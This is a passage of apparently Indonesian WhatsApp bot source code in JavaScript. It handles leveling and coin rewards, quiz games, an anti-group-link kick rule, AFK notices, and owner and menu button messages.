        var ucapanWaktu = '️𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑺𝒊𝒂𝒏𝒈'
}
        if(time2 < "11:00:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑷𝒂𝒈𝒊'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑴𝒂𝒍𝒂𝒎'
}
         const levelRole = level.getLevelingLevel(sender, _level)
        var role = 'Warrior III'
        if (levelRole <= 5) {
            role = 'Warrior II'
        } else if (levelRole <= 10) {
            role = 'Warrior I'
        } else if (levelRole <= 15) {
            role = 'Elite III'
        } else if (levelRole <= 20) {
            role = 'Elite II'
        } else if (levelRole <= 25) {
            role = 'Elite I'
        } else if (levelRole <= 30) {
            role = 'Master III'
        } else if (levelRole <= 35) {
            role = 'Master II'
        } else if (levelRole <= 40) {
            role = 'Master I'
        } else if (levelRole <= 45) {
            role = 'GrandMaster III'
        } else if (levelRole <= 50) {
            role = 'GrandMaster II'
        } else if (levelRole <= 55) {
            role = 'GrandMaster I'
        } else if (levelRole <= 60) {
            role = 'Epic III'
        } else if (levelRole <= 65) {
            role = 'Epic II'
        } else if (levelRole <= 70) {
            role = 'Epic I'
        } else if (levelRole <= 75) {
            role = 'Legend III'
        } else if (levelRole <= 80) {
            role = 'Legend II'
        } else if (levelRole <= 85) {
            role = 'Legend I'
        } else if (levelRole <= 90) {
            role = 'Mythic'
        } else if (levelRole <= 95) {
            role = 'Mythical Glory'
        } else if (levelRole >= 100) {
            role = 'Immortal'
        } 
        
       // FUNCTION LEVELING
       if (isGroup && !mek.key.fromMe && !level.isGained(sender) && isLevelingOn) {
       try {
       level.addCooldown(sender)
       const checkATM = atm.checkATMuser(sender, _uang)
       if (checkATM === undefined) atm.addATM(sender, _uang)
       const uangsaku = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       atm.addKoinUser(sender, uangsaku, _uang)
       const currentLevel = level.getLevelingLevel(sender, _level)
       const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
       level.addLevelingXp(sender, amountXp, _level)
       if (requiredXp <= level.getLevelingXp(sender, _level)) {
       level.addLevelingLevel(sender, 1, _level)
       const userLevel = level.getLevelingLevel(sender, _level)
       const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
       reply(`*「 LEVEL UP 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n➸ *Role*: *${role}*\n\nCongrats!! 🎉🎉`)
} 
       } catch (err) {
       console.error(err)
}
}
        colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		if (!mek.key.fromMe && !isOwner && banChats === true) return

      // Anti link
        if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                reply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                Hisnu.groupRemove(from, [sender])
            }
        }        
        // Sewa
             _sewa.expiredCheck(Hisnu, sewa)
             
        // MUTE
             if (isMuted){
             if (!isGroupAdmins && !isPremium) return
 }
            
              const getWin = (userId) => {
              let position = false
              Object.keys(_win).forEach((i) => {
              if (_win[i].jid === userId) {
              position = i
       }
        })
              if (position !== false) {
              return _win[position].win
            }
        }
      // GAME 
             game.cekWaktuFam(Hisnu, family100)
          
            if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var http = randomNomor(100)
                    atm.addKoinUser(sender, http, _uang)
                    await reply(`*_🎮 Tebak Gambar  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${http} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakgambar*`)
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                }
            }
        if (game.isfam(from, family100)) {
            var anjuy = game.getjawaban100(from, family100)
            for (let i of anjuy){
                if (budy.toLowerCase().includes(i)){
                    var htgmp = Math.floor(Math.random() * 20) + 1
                    atm.addKoinUser(sender, htgmp, _uang)
                    await reply(`*Jawaban benar*\n*Jawaban :* ${i}\n*Hadiah :* $${htgmp}\n*Jawaban yang blum tertebak :* ${anjuy.length - 1}`)
                    var anug = anjuy.indexOf(i)
                    anjuy.splice(anug, 1)
                }
            }
            if (anjuy.length < 1){
                Hisnu.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)
                family100.splice(game.getfamposi(from, family100), 1)
            }
       }
            if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakanime[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmu = randomNomor(100)
                    atm.addKoinUser(sender, htgmu, _uang)
                    await reply(`*_🎮 Tebak Anime 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakanime*`)
                    delete tebakanime[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                }
            }
            if (tebaklagu.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklagu[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htpl = randomNomor(100)
                    atm.addKoinUser(sender, htpl, _uang)
                    await reply(`*_🎮 Tebak Lagu 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpl} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklagu*`)
                    delete tebaklagu[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
                }
            }
            if (tebaktebakan.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaktebakan[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htpu = randomNomor(100)
                    atm.addKoinUser(sender, htpu, _uang)
                    await reply(`*_🎮 Tebak Tebakan 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaktebakan*`)
                    delete tebaktebakan[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))                    
                }
            }
            if (kuismath.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = kuismath[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htcc = randomNomor(100)
                    atm.addKoinUser(sender, htcc, _uang)
                    await reply(`*_🎮 Kuis Matematika  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}kuismath*`)
                    delete kuismath[sender.split('@')[0]]
                    fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
                }
            }
          if (asahotak.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = asahotak[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgm = randomNomor(100)
                    atm.addKoinUser(sender, htgm, _uang)
                    await reply(`*_🎮 Asah Otak  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgm} 💰_\n\nIngin bermain lagi? kirim *${prefix}asahotak*`)
                    delete asahotak[sender.split('@')[0]]
                    fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
                }
            }
          if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = caklontong[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmi = randomNomor(100)
                    atm.addKoinUser(sender, htgmi, _uang)
                    await reply(`*_🎮 Caklontong  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmi} 💰_\n\nIngin bermain lagi? kirim *${prefix}caklontong*`)
                    delete caklontong[sender.split('@')[0]]
                    fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                }
            }
          if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakjenaka[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmuu = randomNomor(100)
                    atm.addKoinUser(sender, htgmuu, _uang)
                    await reply(`*_🎮 Tebak Jenaka  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmuu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakjenaka*`)
                    delete tebakjenaka[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
                }
            }
            if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklirik[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmii = randomNomor(100)
                    atm.addKoinUser(sender, htgmii, _uang)
                    await reply(`*_🎮 Tebak Lirik 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmii} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklirik*`)
                    delete tebaklirik[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
                }
            }
            if (tebakimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakimia[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmcc = randomNomor(100)
                    atm.addKoinUser(sender, htgmcc, _uang)
                    await reply(`*_🎮 Tebak Kimia 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkimia*`)
                    delete tebakimia[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
                }
            }
          if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaksiapaaku[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmk = randomNomor(100)
                    atm.addKoinUser(sender, htgmk, _uang)
                    await reply(`*_🎮 Tebak Siapakah Aku  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmk} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaksiapaaku*`)
                    delete tebaksiapaaku[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
                }
            }
          if (tebakbendera.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakbendera[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var html = randomNomor(100)
                    atm.addKoinUser(sender, html, _uang)
                    await reply(`*_🎮 Tebak Bendera  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${html} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakbendera*`)
                    delete tebakbendera[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
                }
            }
          if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = susunkata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htmp = randomNomor(100)
                    atm.addKoinUser(sender, htmp, _uang)
                    await reply(`*_🎮 Susun Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmp} 💰_\n\nIngin bermain lagi? kirim *${prefix}susunkata*`)
                    delete susunkata[sender.split('@')[0]]
                    fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
                }
            }
          if (tebakata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htmu = randomNomor(100)
                    atm.addKoinUser(sender, htmu, _uang)
                    await reply(`*_🎮 Tebak Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkata*`)
                    delete tebakata[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
                }
            }
// AFK
	if (isGroup) {
		if (!mek.key.fromMe && mek.key.fromMe) return
		for (let x of mentionUser) {
		    if (afk.checkAfkUser(x, _afk)) {
			const getId = afk.getAfkId(x, _afk)
			const getReason = afk.getAfkReason(getId, _afk)
			const getTime = afk.getAfkTime(getId, _afk)
			const cptl = `*「 AFK MODE 」*\n
*Sssttt! Orangnya lagi AFK, jangan diganggu!*
➸ *Alasan*  : ${getReason}
➸ *Sejak* : ${getTime}`
      mentions(cptl, x, true)
    }}
		if (afk.checkAfkUser(sender, _afk) && !isCmd) {
		    const getTime = afk.getAfkTime(sender, _afk)
		    const getReason = afk.getAfkReason(sender, _afk)
		    const ittung = ms(await Date.now() - getTime)
		    const pep = `*${pushname}* telah kembali dari AFK! Selamat datang kembali~`
		    reply(pep)
		    _afk.splice(afk.getAfkPosition(sender, _afk), 1)
		    fs.writeFileSync('./database/user/afk.json', JSON.stringify(_afk))
		}
	    }

       if (!setting.autoread) {
       Hisnu.chatRead(from)
       }
       if (!setting.autocomposing) {
       Hisnu.updatePresence(from, Presence.composing)
       }
       if (!setting.autocomposing) {
       Hisnu.updatePresence(from, Presence.composing)
       }
	    //𝘼𝙐𝙏𝙊 𝙍𝙀𝘼𝘿 𝙂𝙒 𝙋𝘼𝙆𝙀 𝙔𝙂 𝘼𝙏𝘼𝙎
        //Hisnu.chatRead(from, "read")
        //𝘼𝙐𝙏𝙊 𝙑𝙉 𝙂𝙒 𝙋𝘼𝙆𝙀 𝙔𝙂 𝘼𝙏𝘼𝙎 𝙅𝙐𝙂𝘼 
        await Hisnu.updatePresence(from, Presence.composing)
	    //𝘼𝙐𝙏𝙊 𝙍𝙀𝘼𝘿 𝙂𝙒 𝙋𝘼𝙆𝙀 𝙔𝙂 𝘼𝙏𝘼𝙎
        Hisnu.chatRead(from, "read")
        //𝘼𝙐𝙏𝙊 mengetik 𝙂𝙒 𝙋𝘼𝙆𝙀 𝙔𝙂 𝘼𝙏𝘼𝙎 𝙅𝙐𝙂𝘼 
        await Hisnu.updatePresence(from, Presence.composing)
        
       //𝘾𝙈𝘿 𝙉𝙔𝘼 𝙉𝙂𝘼𝘽
        if (isCmd && !isGroup)
		    atm.addKoinUser(sender, randomNomor(20), _uang)
            console.log(color('[ CMD ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        
        if (isCmd && isGroup)
            atm.addKoinUser(sender, randomNomor(20), _uang)
            console.log(color('[ CMD ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
            
        if (budy.toLowerCase() === `8473`){
		if (isRegister) return 
		    register.push(sender)
		    fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
		    teks = `Verification success\n\nPlease send *!menu* to view menu`
		    atm.addKoinUser(sender, randomNomor(100), _uang)
		    Hisnu.sendMessage(from, teks, text, {quoted: freply })
}
	              switch(command){
 
         case 'owner':
         case 'creator':  
         
			         ini_ownerNumber = [`${owner}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname = Hisnu.contacts[i] != undefined ? Hisnu.contacts[i].vname || Hisnu.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'KunzxD',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${Hisnu.user.name}`}\nORG: Gk Usah Minta Sv Ajg;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await Hisnu.sendMessage(from, {
					"displayName": `${owner} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: ftroli})
					var ini_gopayy =`𝑯𝒂𝒍𝒍𝒐 @${sender.split("@")[0]} 𝑰𝒕𝒖 𝑫𝒊𝒂𝒕𝒂𝒔 𝑵𝒐𝒎𝒐𝒓 𝑶𝒘𝒏𝒆𝒓 𝑺𝒂𝒚𝒂\n𝑮𝒂𝒌 𝑼𝒔𝒂𝒉 𝑫𝒊 𝑺𝒗 𝑮𝒌 𝑷𝒆𝒏𝒕𝒊𝒏𝒈`
var buttonss = [
{buttonId: '#menu', buttonText:{displayText: 'Donasi ♨️'}, type: 1},
{buttonId: '#menu', buttonText:{displayText: 'List Sewa 🔖'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${time} WIB\n${timeMak} WITA\n${timeJay} WIT` ,
buttons: buttonss,
headerType: 1
}
Hisnu.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftroli,sendEphemeral: true 
			})
					break
         case 'menu':
        case 'help':
        case 'kunz':  
               const boy = "6281333603591@s.whatsapp.net"     
               const filename = `@${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
               const nomoruser = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
               parseMention = (text = '') => {
               return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}
               totalChat = await Hisnu.chats.all()
               groups = Hisnu.chats.array.filter(v => v.jid.endsWith('g.us'))
               privat = Hisnu.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
               total = math(`${groups.length}*${privat.length}`)
               timestampe = speed();
               latensie = speed() - timestampe             
               menu =`K U N Z B O T Z`                          
               buttons = [{buttonId: `${prefix}command`,buttonText:{displayText: 'COMMAND🤡'},type:1},{buttonId:`${prefix}allmenu`,buttonText:{displayText:'ALLMENU☠️'},type:1},{buttonId: `${prefix}rules`,buttonText:{displayText: 'RULES⚡'},type:1},{buttonId:`${prefix}allmenu`,buttonText:{displayText:'ALLMENU'},type:1}]

               imageMsg = (await Hisnu.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/Menu.jpg`)})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText: `Hai Kak ${pushname}! Saya Adalah Bot Whatsapp Yang Akan Membantu Kamu Untuk Membuat Sticker Atau Lainnya ,Ingin Menggunakan Fitur BOT? Ketuk Button Dibawah Ini
           ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏ Jika Button Tidak Muncul Ketik .allmenu Atau .command
`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}
            
               prep = await Hisnu.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek, contextInfo:{ mentionedJid: parseMention(menu), externalAdReply: {
							title: `Hai ${pushname} 👋`,
							body: `${tanggal}`,
							previewType: 1,
							thumbnailUrl: "https://ibb.co/FzLx165/Nakano.jpg",
							thumbnail: fs.readFileSync('./media/Nakano.jpg'), }, forwardingScore:508, isForwarded:true, mentionedJid:[Tag + '@s.whatsapp.net', senderr]}})
                            Hisnu.relayWAMessage(prep)
                            break
//<==========[ ALL MENU ]==========>  
                 case 'allmeu':
                           tagme = '6287778886786'
                           timestampe = speed();
                           latensie = speed() - timestampe
                           parseMention = (text = '') => {
                           return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}
                           anus = sender
                           var menu = `*𝙆𝙐𝙉𝙕 𝘽𝙊𝙏𝙕*

*🤖 𝑪𝒓𝒆𝒂𝒕𝒐𝒓 :* @${tagme}
*🤖 𝑩𝒂𝒕𝒓𝒆𝒂𝒊 :* ${baterai}%
*🤖 𝑷𝒓𝒆𝒇𝒊𝒙 :* 𝑴𝒖𝒍𝒕𝒊-𝑷𝒓𝒆𝒇𝒊𝒙
*🤖 𝑮𝒓𝒖𝒑 𝑻𝒐𝒕𝒂𝒍 :* ${groups.length}
*🤖 𝑷𝒓𝒊𝒗𝒂𝒕𝒆 𝑪𝒉𝒂𝒕 :* ${privat.length}
*🤖 𝑻𝒐𝒕𝒂𝒍 𝑪𝒉𝒂𝒕 :* ${totalChat.length}
*🤖 𝑺𝒑𝒆𝒆𝒅 :* ${latensie.toFixed(4)} 𝒔𝒆𝒄𝒄𝒐𝒏𝒅
*🤖 𝑩𝒐𝒕 𝑴𝒐𝒅𝒆 :* ${banChats ? "𝑺𝑬𝑳𝑭-𝑴𝑶𝑫𝑬" : "𝑷𝑼𝑩𝑳𝑰𝑪-𝑴𝑶𝑫𝑬"}
*🤖 𝑭𝒊𝒕𝒖𝒓 :* 550 𝒇𝒊𝒕𝒖𝒓

*𒍮𝑰𝒏𝒇𝒐 𝒖𝒔𝒆𝒓*
*💰 𝑳𝒆𝒗𝒆𝒍 :* ${levelRole}
*💰 𝑳𝒊𝒎𝒊𝒕 :* Unlimited
*💰 𝑩𝒂𝒍𝒂𝒏𝒄𝒆 :* Rp.870
*💰 𝑵𝒐𝒎𝒐𝒓 :* wa.me/${sender.replace('@s.whatsapp.net', '')}

*⌕ 𝑰𝒏𝒅𝒐𝒏𝒆𝒔𝒊𝒂𝒔 𝑻𝒊𝒎𝒆 ☪︎*
*⏰ ${time} 𝑾𝑰𝑩* ⏰
*⏰ ${timeMak} 𝑾𝑰𝑻𝑨* ⏰
*⏰ ${timeJay} 𝑾𝑰𝑻* ⏰
